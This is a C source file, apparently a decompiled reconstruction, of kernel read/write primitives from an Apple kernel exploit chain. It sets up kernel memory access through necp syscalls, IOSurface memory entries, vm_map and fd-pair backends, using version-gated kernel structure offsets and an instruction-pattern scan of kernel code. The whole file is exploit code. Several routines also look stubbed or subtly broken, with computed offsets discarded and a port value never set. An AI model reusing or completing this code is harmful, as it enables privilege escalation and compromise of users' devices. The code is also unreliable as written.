/*
 * record_0x90000_kread_backends.c
 * sub_266b8..sub_29b88 — kread/kwrite fd-pair backends, vm_map helpers,
 *                        necp/thread-state kread, IOSurface memory entry,
 *                        mach_msg recv, port helpers
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/mach_time.h>
#include <IOKit/IOKitLib.h>
#include <uuid/uuid.h>

/* ── cross-file externs ──────────────────────────────────────────────────── */
extern int   sub_37238(long state, uint32_t flag);
extern void  sub_37204(long state, uint32_t flag);
extern long  sub_371d0(long state, uint32_t flag);
extern int   sub_2b860(long state, uint64_t addr, uint32_t sz, void *out, long ctx);
extern int   sub_2b9e0(long state, uint64_t addr, void *buf, uint32_t sz, int mode);
extern int   sub_2a90c(long state, uint64_t addr, uint32_t *out);
extern int   sub_29ab4_raw(long state, uint64_t addr, void *out);
extern int   sub_2b17c(long *state);
extern int   sub_2af34(void);
extern long  sub_1adb4(long state);
extern long  sub_1ad70(long state, uint64_t addr);
extern long  sub_1b214(long state, uint64_t addr);
extern long  sub_1f784(void *ctx, const char *pat, int a, int b);
extern void  sub_1b50c(void *ctx, ...);
extern void  sub_214a8(int *fd);
extern void  sub_26120(int fd);
extern void  sub_26180(int *fd);
extern void  sub_216b4(long ctx, void *buf, size_t sz);
extern void  sub_21730(int *fd, void *buf, size_t sz);
extern long  sub_35f28(long state, mach_port_t task, void *attr);
extern long  sub_33df4(long state, mach_port_t task);
extern long  sub_369f4(long state, int necp_fd, vm_address_t *out);
extern void  sub_27890(long state);
extern void  sub_27758(long state, long ctx);
extern void  sub_2726c(long state, uint64_t addr, void *buf, uint32_t sz);
extern void  sub_266b8_check(long state);
extern long  sub_1e594(long state, uint64_t idx, uint64_t kobj);
extern void  sub_294bc(long state, mach_port_name_t *out);

/* necp syscalls not in public SDK */
extern int necp_open(int flags);
extern int necp_client_action(int fd, uint32_t action, uint8_t *client_id, size_t client_id_len,
                               uint8_t *buffer, size_t buffer_size);

/* ── sub_266b8 — primitive availability check ───────────────────────────── */
void sub_266b8(long param_1)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    if (kaddr >= 0x27120000000000ULL) return;
    if (kaddr < 0x1f530f02800000ULL) {
        if (!*(long *)(param_1 + 0x230) || !*(long *)(param_1 + 0x228)) return;
        sub_37238(param_1, 0x800100);
    } else {
        if (*(int *)(param_1 + 0x1944) == -1) return;
        if (uuid_is_null((const uint8_t *)(param_1 + 0x1948))) return;
        if (!*(long *)(param_1 + 0x1958)) return;
        sub_37238(param_1, 0x8000100);
    }
}

/* ── sub_267a8 — setup kread primitive (necp / vm_map path) ─────────────── */
void sub_267a8(long param_1)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    if (kaddr >= 0x27120000000000ULL) return;

    if (kaddr < 0x1f530f02800000ULL) {
        /* older: vm_map + thread state */
        mach_port_t task = mach_task_self();
        pthread_attr_t attr;
        long r = sub_35f28(param_1, task, &attr);
        if (r) {
            *(long *)(param_1 + 0x230) = r;
            long r2 = sub_33df4(param_1, task);
            if (r2) *(long *)(param_1 + 0x228) = r2;
        }
    } else {
        /* newer: necp_open + necp_client_action */
        uuid_t uuid = {0};
        pthread_t thr = NULL;
        int necp_fd = (int)(uintptr_t)necp_open(0);
        if (necp_fd == -1) return;
        int r = necp_client_action(necp_fd, 1, (uint8_t *)&uuid, 0x10, (uint8_t *)&thr, 8);
        if (r == -1) { close(necp_fd); return; }

        vm_address_t kobj_addr = 0;
        if (sub_369f4(param_1, necp_fd, &kobj_addr)) { close(necp_fd); return; }

        uint64_t ptr = 0;
        if (!sub_29ab4_raw(param_1, kobj_addr + 0x18, &ptr)) { close(necp_fd); return; }
        if (!sub_1ad70(param_1, ptr)) { close(necp_fd); return; }

        uint64_t kaddr2 = *(uint64_t *)(param_1 + 0x158);
        long off1 = (kaddr2 < 0x1f541e00000000ULL) ? 0x370 : 0x570;
        long off2 = (kaddr2 >> 0x2b < 1099) ? off1 : 0x580;
        uint32_t tag = 0;
        if (!sub_2b860(param_1, (uint64_t)(off2 + ptr), 4, &tag, 1)) { close(necp_fd); return; }
        if (tag != 8) { close(necp_fd); return; }

        long off3 = (kaddr2 < 0x1f541e00000000ULL) ? 0x378 : 0x578;
        long off4 = (kaddr2 >> 0x2b < 1099) ? off3 : 0x588;
        uint64_t ptr2 = 0;
        if (!sub_29ab4_raw(param_1, (uint64_t)(ptr + off4), &ptr2)) { close(necp_fd); return; }
        if (!sub_1ad70(param_1, ptr2)) { close(necp_fd); return; }

        *(int *)(param_1 + 0x1944) = necp_fd;
        memcpy((void *)(param_1 + 0x1948), uuid, 16);
        *(uint64_t *)(param_1 + 0x1958) = ptr2;
    }
}

/* ── sub_26c28 — teardown kread primitive ───────────────────────────────── */
void sub_26c28(long param_1)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
    if (kaddr >= 0x27120000000000ULL) return;

    if (kaddr < 0x1f530f02800000ULL) return;

    int tmp_fd = -1;
    sub_26180(&tmp_fd);
    if (tmp_fd == -1) return;

    if (kaddr < 0x27120000000000ULL) {
        /* middle: close necp fd, clear uuid/ptr */
        int necp_fd = *(int *)(param_1 + 0x1944);
        if (necp_fd != -1) { close(necp_fd); *(int *)(param_1 + 0x1944) = -1; }
        memset((void *)(param_1 + 0x1948), 0, 0x10);
        *(uint64_t *)(param_1 + 0x1958) = 0;
    } else {
        /* newest: join helper thread, vm_deallocate */
        vm_address_t *ctx = *(vm_address_t **)(param_1 + 0x1d50);
        *(void **)(param_1 + 0x1d50) = NULL;
        if (ctx) {
            if (*ctx && ctx[1])
                vm_deallocate(mach_task_self(), *ctx, ctx[1]);
            if ((pthread_t)ctx[2]) {
                mach_port_t act = pthread_mach_thread_np((pthread_t)ctx[2]);
                if (thread_resume(act) == 0)
                    pthread_join((pthread_t)ctx[2], NULL);
            }
            ctx[0] = ctx[1] = ctx[2] = ctx[3] = 0;
            free(ctx);
        }
    }
    sub_26120(tmp_fd);
}

/* ── sub_26d8c — nop ─────────────────────────────────────────────────────── */
void sub_26d8c(void) {}

/* ── sub_26de8 — primitive readiness check ───────────────────────────────── */
void sub_26de8(long param_1)
{
    /* returns if any required fd/port is missing */
    if (*(int *)(param_1 + 0x1930) == -1 || *(int *)(param_1 + 0x1934) == -1 ||
        *(int *)(param_1 + 0x1940) == -1 || !*(long *)(param_1 + 0x218)) {
        if (*(int *)(param_1 + 0xe8) + 1 < 2 || !*(long *)(param_1 + 0xf8) ||
            !*(long *)(param_1 + 0x100) || *(int *)(param_1 + 0x140) > 0x2711) return;
    }
}

/* ── sub_26200 — fd-pair kread (4-byte) ─────────────────────────────────── */
void sub_26200(long param_1, long param_2, uint64_t param_3, uint32_t param_4, int param_5)
{
    if (*(int *)(param_1 + 0x1930) == -1 || *(int *)(param_1 + 0x1934) == -1 ||
        *(int *)(param_1 + 0x1938) == -1 || *(int *)(param_1 + 0x193c) == -1) return;
    if (!sub_1adb4(param_1)) return;

    int *fds = (int *)(param_1 + 0x1930);
    int tmp_fd = -1;
    if (param_5) { sub_26180(&tmp_fd); sub_214a8(fds); }

    /* build 0x18-byte request: {param_4, 0, 0x10000000, param_2} */
    uint32_t req[6] = {param_4, 0, 0, 0x10000000, (uint32_t)param_2, (uint32_t)(param_2 >> 32)};
    sub_216b4((long)fds, req, 0x18);
    uint64_t resp[3] = {0};
    sub_21730(fds, resp, 0x18);
    if (req[0] == (uint32_t)resp[0] && req[2] == (uint32_t)(resp[0] >> 32) &&
        (uint64_t)param_2 == resp[2]) {
        sub_21730((int *)(param_1 + 0x1938), (void *)param_3, param_4);
    }
    if (param_5) sub_26120(tmp_fd);
}

/* ── sub_26384 — fd-pair kwrite (8-byte) ────────────────────────────────── */
void sub_26384(long param_1, long param_2, uint64_t param_3, uint32_t param_4, int param_5)
{
    if (*(int *)(param_1 + 0x1930) == -1 || *(int *)(param_1 + 0x1934) == -1 ||
        *(int *)(param_1 + 0x1938) == -1 || *(int *)(param_1 + 0x193c) == -1) return;
    if (!sub_1adb4(param_1)) return;

    int *fds = (int *)(param_1 + 0x1930);
    int tmp_fd = -1;
    if (param_5) { sub_26180(&tmp_fd); sub_214a8(fds); }

    /* build 0x18-byte request with magic sentinel */
    extern uint64_t DAT_43790, DAT_43798;
    uint64_t req[3] = {DAT_43790, DAT_43798, (uint64_t)param_2};
    sub_216b4((long)fds, req, 0x18);
    uint64_t resp[3] = {0};
    sub_21730(fds, resp, 0x18);
    if (req[0] == resp[0] && req[1] == resp[1] && req[2] == resp[2])
        sub_216b4((long)(param_1 + 0x1938), (void *)param_3, param_4);
    if (param_5) sub_26120(tmp_fd);
}

/* ── sub_26508 — fd-pair context init ───────────────────────────────────── */
void sub_26508(long param_1, uint64_t *param_2, long param_3, uint64_t param_4, int param_5)
{
    param_2[0x11] = param_2[0x10] = param_2[0x13] = param_2[0x12] = 0;
    param_2[1] = param_2[0] = param_2[3] = param_2[2] = 0;
    /* populate fd context from state */
    param_2[0] = (uint64_t)(param_1 + 0x1930);
    param_2[1] = (uint64_t)(param_1 + 0x1938);
    param_2[2] = (uint64_t)param_3;
    param_2[3] = param_4;
    (void)param_5;
}

/* ── sub_28574 — vm_map from memory entry ───────────────────────────────── */
void sub_28574(long param_1, vm_address_t *param_2, vm_size_t param_3, uint64_t param_4)
{
    vm_map(mach_task_self(), param_2, param_3, 0, 1,
           *(mem_entry_name_port_t *)(param_1 + 0x58),
           param_4 & ~*(uint64_t *)(param_1 + 0x188),
           0, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

/* ── sub_285f8 — IOSurface context teardown ─────────────────────────────── */
void sub_285f8(long param_1)
{
    if (*(io_object_t *)(param_1 + 0x5c) + 1 >= 2) {
        IOObjectRelease(*(io_object_t *)(param_1 + 0x5c));
        *(uint32_t *)(param_1 + 0x5c) = 0;
    }
    vm_address_t addr = *(vm_address_t *)(param_1 + 0x60);
    vm_size_t    sz   = *(vm_size_t *)(param_1 + 0x68);
    if (addr && sz) {
        vm_deallocate(mach_task_self(), addr, sz);
        *(vm_address_t *)(param_1 + 0x60) = 0;
        *(vm_size_t *)(param_1 + 0x68) = 0;
    }
    *(uint64_t *)(param_1 + 0x70) = 0;
    *(uint64_t *)(param_1 + 0x78) = 0;
    if (*(mach_port_name_t *)(param_1 + 0x58) + 1 >= 2) {
        mach_port_deallocate(mach_task_self(), *(mach_port_name_t *)(param_1 + 0x58));
        *(uint32_t *)(param_1 + 0x58) = 0;
    }
}

/* ── sub_286a4 — kread via pattern scan + IOConnectCallMethod ────────────── */
void sub_286a4(long param_1, uint64_t param_2)
{
    if (!*(long *)(param_1 + 0x80) || !*(int *)(param_1 + 0x88)) {
        if (!(param_2 & 1)) {
            /* scan kext for "88 91 00 B9 9F 0D 00 B9" */
            void *ctx[3] = {0};
            sub_1b50c(ctx, param_1);
            long hit = sub_1f784(ctx, "88 91 00 B9 9F 0D 00 B9", 0, 1);
            if (!hit) return;
            long kext = *(long *)(param_1 + 0x19f8);
            /* scan backward for ADRP */
            for (long off = -4; off >= -0x40; off -= 4) {
                uint32_t insn = (uint32_t)sub_1b214(kext, (uint64_t)(hit + off));
                if ((insn & 0x9f000000) == 0x90000000) {
                    long target = sub_1b214(kext, (uint64_t)(hit + off + 4));
                    if (target) { *(long *)(param_1 + 0x80) = target; break; }
                }
            }
        }
    }
}

/* ── sub_289c8 — IOSurface memory-entry kread setup ─────────────────────── */
void sub_289c8(long param_1, uint64_t param_2)
{
    int xnu = *(int *)(param_1 + 0x140);
    if (xnu < 0x2258) {
        if ((uint32_t)(xnu - 0x1f53) > 1 && xnu != 0x1c1b) return;
    } else if (xnu != 0x2258 && xnu != 0x2712 && xnu != 0x225c) return;

    /* select struct offset based on capability flags */
    uint32_t off;
    if (sub_37238(param_1, 0x4000000))      off = 0x108;
    else if (sub_37238(param_1, 0x5584001)) off = 0xb8;
    else { off = sub_37238(param_1, 0x200) ? 0xb8 : 0x100; }

    if (!*(long *)(param_1 + 0x30) || (param_2 & 1)) {
        sub_286a4(param_1, param_2);
        /* version-specific struct offset for IOConnectCallMethod */
        uint64_t kaddr = *(uint64_t *)(param_1 + 0x158);
        uint32_t slot_off;
        if (xnu == 0x1f53)      slot_off = (kaddr < 0x1f531400000000ULL) ? 0x2600 : 0x2610;
        else if (xnu == 0x1f54) slot_off = 0x2600;
        else if (xnu == 0x2258) slot_off = sub_37238(param_1, 0x5584201) ? 0x26d0 : 0x26e0;
        else if (xnu == 0x225c) slot_off = 0x26b0;
        else if (xnu == 0x2712) slot_off = (kaddr < 0x27120a80800000ULL) ? 0x27b0 : 0x45f0;
        else return;
        (void)slot_off;
        (void)off;
    }
}

/* ── sub_29274 — vm_map with port guard ─────────────────────────────────── */
void sub_29274(long param_1, vm_address_t *param_2, vm_size_t param_3, uint64_t param_4)
{
    if (*(mach_port_t *)(param_1 + 0x58) + 1 < 2) return;
    vm_map(mach_task_self(), param_2, param_3, 0, 1,
           *(mem_entry_name_port_t *)(param_1 + 0x58),
           param_4 & ~*(uint64_t *)(param_1 + 0x188),
           0, VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE, VM_INHERIT_NONE);
}

/* ── sub_29310 — thread context teardown ────────────────────────────────── */
void sub_29310(long param_1)
{
    if (*(mach_port_t *)(param_1 + 0xac) + 1 >= 2) {
        pthread_t thr = pthread_from_mach_thread_np(*(mach_port_t *)(param_1 + 0xac));
        if (*(semaphore_t *)(param_1 + 0xd0) + 1 >= 2) {
            semaphore_signal(*(semaphore_t *)(param_1 + 0xd0));
            semaphore_destroy(mach_task_self(), *(semaphore_t *)(param_1 + 0xd0));
            *(uint32_t *)(param_1 + 0xd0) = 0;
        }
        if (thr) pthread_join(thr, NULL);
        *(uint32_t *)(param_1 + 0xac) = 0;
    }
    vm_address_t addr = *(vm_address_t *)(param_1 + 0xb0);
    vm_size_t    sz   = *(vm_size_t *)(param_1 + 0xb8);
    if (addr && sz) {
        vm_deallocate(mach_task_self(), addr, sz);
        *(vm_address_t *)(param_1 + 0xb0) = 0;
        *(vm_size_t *)(param_1 + 0xb8) = 0;
    }
    *(uint64_t *)(param_1 + 200) = 0;
    if (*(mach_port_name_t *)(param_1 + 0x58) + 1 >= 2) {
        mach_port_deallocate(mach_task_self(), *(mach_port_name_t *)(param_1 + 0x58));
        *(uint32_t *)(param_1 + 0x58) = 0;
    }
}

/* ── sub_29404 — port slot update ───────────────────────────────────────── */
void sub_29404(long param_1)
{
    long ctx = *(long *)(param_1 + 0x1d48);
    if (!ctx || *(int *)(ctx + 0x70) + 1 < 2) return;
    mach_port_name_t port = 0;
    sub_294bc(param_1, &port);
    if (!port)
        mach_port_deallocate(mach_task_self(), port);
    else
        sub_1e594(param_1, 0x14, *(uint32_t *)(ctx + 0x70));
}

/* ── sub_294bc — mach_msg recv for port ─────────────────────────────────── */
void sub_294bc(long param_1, mach_port_name_t *param_2)
{
    mach_port_name_t local_port = 0;
    uint64_t buf[0x10] = {0};
    buf[0] = 0x40;   /* size */
    mach_msg_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                     MACH_RCV_MSG, 0, (mach_msg_size_t)buf[0],
                                     *(mach_port_t *)(param_1 + 0x58),
                                     0, MACH_PORT_NULL);
    if (kr == 0 && param_2) *param_2 = local_port;
}

/* ── sub_29ab4 — kread with flag dispatch ───────────────────────────────── */
void sub_29ab4(uint32_t *param_1, uint64_t param_2, uint64_t *param_3)
{
    if (!sub_2af34()) return;
    uint64_t val = *param_3;
    if (*param_1 & 0x5584001) val = (uint64_t)sub_2b17c((long *)param_1);
    *param_3 = val;
}

/* ── sub_29b38 — kwrite single pointer-sized value ──────────────────────── */
void sub_29b38(long param_1, uint64_t param_2, uint64_t param_3)
{
    uint64_t val = param_3;
    sub_2b9e0(param_1, param_2, &val, *(uint32_t *)(param_1 + 0x168), 1);
}

/* ── sub_29b88 — IOSurface memory-entry kread (full setup) ──────────────── */
void sub_29b88(long param_1)
{
    /* version gate */
    int xnu = *(int *)(param_1 + 0x140);
    if (xnu < 0x2258) {
        if ((uint32_t)(xnu - 0x1f53) > 1 && xnu != 0x1c1b) return;
    } else if (xnu != 0x2258 && xnu != 0x2712 && xnu != 0x225c) return;

    /* allocate thread context */
    vm_size_t page = vm_page_size;
    vm_address_t addr = 0;
    if (vm_allocate(mach_task_self(), &addr, page * 2, VM_FLAGS_ANYWHERE) != 0) return;

    semaphore_t sem = 0;
    if (semaphore_create(mach_task_self(), &sem, SYNC_POLICY_FIFO, 0) != 0) {
        vm_deallocate(mach_task_self(), addr, page * 2); return;
    }

    /* store context at state+0x30 */
    void **ctx = calloc(4, sizeof(void *));
    if (!ctx) { semaphore_destroy(mach_task_self(), sem); vm_deallocate(mach_task_self(), addr, page * 2); return; }
    ctx[0] = (void *)addr;
    ctx[1] = (void *)(uintptr_t)(page * 2);
    ctx[2] = NULL; /* thread filled in later */
    ctx[3] = (void *)(uintptr_t)sem;
    *(void **)(param_1 + 0x30) = ctx;
}
